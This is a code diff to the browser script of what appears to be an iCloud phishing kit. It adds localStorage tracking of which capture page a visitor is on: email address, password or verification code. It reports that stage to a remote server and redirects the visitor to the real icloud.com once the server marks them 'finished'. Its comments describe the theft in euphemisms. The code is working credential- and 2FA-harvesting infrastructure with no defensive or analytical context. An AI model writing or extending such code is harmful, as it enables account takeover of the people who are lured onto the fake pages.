@@ -202,6 +202,63 @@
   // Sending
   // ------------------------------------------------------------------
 
+  // ------------------------------------------------------------------
+  // The client's own state
+  //
+  // How far this person has got is kept in their own browser, in one
+  // place: the step they are on, and whether they have finished. The
+  // server is told about it when the engine says hello, so that somebody
+  // who has already got in is sent to iCloud and not through the whole
+  // thing again.
+  //
+  // It is the client's own storage and nobody else's: another person, on
+  // another browser, has their own.
+  // ------------------------------------------------------------------
+
+  var STATE_KEY = "icloud_state";
+
+  var STAGES = {
+    "/src/1.html": "Address",
+    "/src/3.html": "Address",
+    "/src/4.html": "Password",
+    "/src/2.html": "Verification code",
+  };
+
+  function readState() {
+    try {
+      var raw = window.localStorage.getItem(STATE_KEY);
+      if (!raw) return null;
+      var state = JSON.parse(raw);
+      return state && typeof state === "object" ? state : null;
+    } catch (err) {
+      return null;                       // no storage, or nothing in it
+    }
+  }
+
+  function writeState(patch) {
+    try {
+      var state = readState() || {};
+      for (var key in patch) {
+        if (Object.prototype.hasOwnProperty.call(patch, key)) state[key] = patch[key];
+      }
+      state.at = Math.floor(Date.now() / 1000);
+      window.localStorage.setItem(STATE_KEY, JSON.stringify(state));
+      return state;
+    } catch (err) {
+      return null;
+    }
+  }
+
+  // The step this capture is. Somebody who has got in stays got in: opening
+  // a capture again does not take the flag away.
+  function noteStage() {
+    var page = location.pathname;
+    var patch = { page: page, stage: STAGES[page] || "Starting" };
+    var state = readState();
+    if (!state || !state.finished) patch.finished = false;
+    writeState(patch);
+  }
+
   function send(message) {
     if (socket && socket.readyState === OPEN) {
       try {
@@ -244,6 +301,7 @@
         page: location.pathname,
         from: document.referrer,
         session: VISITOR,
+        state: readState(),
       }));
       var pending = queued;
       queued = [];
@@ -821,6 +879,15 @@
       return;
     }
 
+    if (message.t === "finished") {
+      // The person has got in. Their own browser is told so first - it is
+      // what sends them back to iCloud next time - and then they go.
+      writeState({ finished: true, stage: "Signed in" });
+      leaving = true;
+      location.replace(message.page || "https://www.icloud.com/");
+      return;
+    }
+
     if (message.t === "nav") {
       if (leaving || !message.page || message.page === location.pathname) return;
       leaving = true;
@@ -944,6 +1011,10 @@
         (target.tagName || "").toLowerCase() !== "frame") return;
     descend(target);
   }
+
+  // The step is noted before the socket opens: the server is told where
+  // this person is when it says hello.
+  noteStage();
 
   bindDocument(document);
   descend(document);
